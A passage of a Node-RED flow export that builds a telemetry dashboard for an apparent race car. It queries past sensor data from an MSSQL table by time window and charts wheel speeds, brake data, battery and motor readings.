        "id": "aa2bd7450b0bc93e",
        "type": "MSSQL",
        "z": "0208dc768b26306e",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 760,
        "y": 260,
        "wires": [
            [
                "e356dfd0b6f66564",
                "aa99f8232a20286c",
                "6ee1eaa9c67b5ac5",
                "361a6099fc3bfb73",
                "30ba88a2b0f1d33d",
                "ebd5e728fd765184",
                "d82e4c1edd1f411a",
                "861015485553d17a",
                "492a6d03c18046f2",
                "adf8540e2052d147",
                "7d9b5de991a58784",
                "4fd0563b6dfe4a9c",
                "9aed8cfc618d4047",
                "d13d415264b13a20"
            ]
        ]
    },
    {
        "id": "0529e4a7cd0375f0",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 500,
        "y": 260,
        "wires": [
            [
                "c33474b65fcccf47",
                "aa2bd7450b0bc93e"
            ]
        ]
    },
    {
        "id": "c33474b65fcccf47",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 760,
        "y": 220,
        "wires": []
    },
    {
        "id": "c2445e63c5487844",
        "type": "ui_text_input",
        "z": "0208dc768b26306e",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 100,
        "y": 240,
        "wires": [
            [
                "d8e7238c8d02286e",
                "45477f7b972db4af"
            ]
        ]
    },
    {
        "id": "8e27a45cac81d3b1",
        "type": "ui_slider",
        "z": "0208dc768b26306e",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 110,
        "y": 280,
        "wires": [
            [
                "d8e7238c8d02286e",
                "78c27038f0b273f1"
            ]
        ]
    },
    {
        "id": "d8e7238c8d02286e",
        "type": "join",
        "z": "0208dc768b26306e",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 290,
        "y": 260,
        "wires": [
            [
                "0529e4a7cd0375f0",
                "bc0ec4e2d145ac9b"
            ]
        ]
    },
    {
        "id": "45477f7b972db4af",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 230,
        "y": 180,
        "wires": []
    },
    {
        "id": "78c27038f0b273f1",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 260,
        "y": 340,
        "wires": []
    },
    {
        "id": "bc0ec4e2d145ac9b",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 450,
        "y": 300,
        "wires": []
    },
    {
        "id": "e356dfd0b6f66564",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "SQL Query Results",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 970,
        "y": 260,
        "wires": []
    },
    {
        "id": "aa99f8232a20286c",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 300,
        "wires": [
            [
                "4a202d366fb96e9b"
            ]
        ]
    },
    {
        "id": "4a202d366fb96e9b",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Wheel Speeds",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "6ee1eaa9c67b5ac5",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_pressure_front);\nlet series2 = msg.payload.map(item => item.brake_pressure_rear);\n\nmsg.payload = [\n    {\n        \"series\": [\"Front Brake Pressure\", \"Rear Brake Pressure\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 340,
        "wires": [
            [
                "10f3d0bd750b8585"
            ]
        ]
    },
    {
        "id": "10f3d0bd750b8585",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Pressures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "361a6099fc3bfb73",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.steering_angle);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Steering Angle\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 380,
        "wires": [
            [
                "18d6989aa55074c9"
            ]
        ]
    },
    {
        "id": "18d6989aa55074c9",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Steering Angle",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "30ba88a2b0f1d33d",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.vehicle_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Vehicle Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 420,
        "wires": [
            [
                "2a2eac3950e62ca9"
            ]
        ]
    },
    {
        "id": "2a2eac3950e62ca9",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Vehicle Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "ebd5e728fd765184",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_temp);\nlet series2 = msg.payload.map(item => item.low_temp);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"High temperatures\", \"Low temperatures\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 460,
        "wires": [
            [
                "d99fb51aef83a941"
            ]
        ]
    },
    {
        "id": "d99fb51aef83a941",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "High/Low Battery Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "d82e4c1edd1f411a",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_open_voltage);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Open Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 500,
        "wires": [
            [
                "fd00e7a7e71572fe"
            ]
        ]
    },
    {
        "id": "fd00e7a7e71572fe",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Open Voltage",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "861015485553d17a",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_amp_hours);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Amp Hours\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 540,
        "wires": [
            [
                "ec24f5a6867c1e4f"
            ]
        ]
    },
    {
        "id": "ec24f5a6867c1e4f",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Amp Hours",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "492a6d03c18046f2",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 580,
        "wires": [
            [
                "d5e05207d12def18"
            ]
        ]
    },
    {
        "id": "d5e05207d12def18",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1210,
        "y": 580,
        "wires": [
            []
        ]
    },
    {
        "id": "adf8540e2052d147",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_temperature);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Temperature\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 620,
        "wires": [
            [
                "90cb6754de2d7c45"
            ]
        ]
    },
    {
        "id": "90cb6754de2d7c45",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 620,
        "wires": [
            []
        ]
    },
    {
        "id": "7d9b5de991a58784",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_temperature_front_left);\nlet series2 = msg.payload.map(item => item.brake_temperature_front_right);\nlet series3 = msg.payload.map(item => item.brake_temperature_rear_left);\nlet series4 = msg.payload.map(item => item.brake_temperature_rear_right);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Brake Temp Front Left\", \"Brake Temperature Front Right\", \"Brake Temperature Rear Left\", \"Brake Temperature Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 660,
        "wires": [
            [
                "e33758779a900714"
            ]
        ]
    },
    {
        "id": "e33758779a900714",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1240,
        "y": 660,
        "wires": [
            []
        ]
    },
    {
        "id": "4fd0563b6dfe4a9c",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_torque_feedback);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Torque Feedback\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 700,
        "wires": [
            [
                "c859318291e219b9"
            ]
        ]
    },
    {
        "id": "9aed8cfc618d4047",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_commanded_torque);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Commanded Torque\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 740,
        "wires": [
            [
                "9519568a49fdb295"
            ]
        ]
    },
    {
        "id": "c859318291e219b9",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Torque Feedback",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 700,
        "wires": [
            []
        ]
    },
    {
        "id": "9519568a49fdb295",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Commanded Torque",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1240,
        "y": 740,
        "wires": [
            []
        ]
    },
    {
        "id": "d13d415264b13a20",
        "type": "function",
        "z": "0208dc768b26306e",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 800,
        "wires": [
            [
                "a18d3b58dcc60ce6"
            ]
        ]
    },
    {
        "id": "a18d3b58dcc60ce6",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "16",
        "height": "9",
        "label": "All Vars",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1200,
        "y": 800,
        "wires": [
            []
        ]
    },
    {
        "id": "416f9617b4288588",
        "type": "MSSQL",
        "z": "eb28fbcf28e5aae9",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 800,
        "y": 140,
        "wires": [
            [
                "781e968617198999",
                "5ea20cae93e67743",
                "067ea4b861a76345",
                "ddb3793baa665a2b",
                "2450c410b4c90958",
                "648b3a05a867bfb6",
                "dc1ae1aafb033480",
                "cca48cef66a2c49d",
                "9aa6592d1262b5b2",
                "60fd3fd1490c62d5",
                "08d1eddcb59d0d2b",
                "846b2dcf25742263",
                "c38968523ba4a727",
                "b1f884da881c8fc2"
            ]
        ]
    },
    {
        "id": "759ee1b25d57a0f8",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 540,
        "y": 140,
        "wires": [
            [
                "8c039838fd59fb40",
                "416f9617b4288588"
            ]
        ]
    },
    {
        "id": "8c039838fd59fb40",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 800,
        "y": 100,
        "wires": []
    },
    {
        "id": "5a726595eecbd189",
        "type": "ui_text_input",
        "z": "eb28fbcf28e5aae9",
        "name": "",
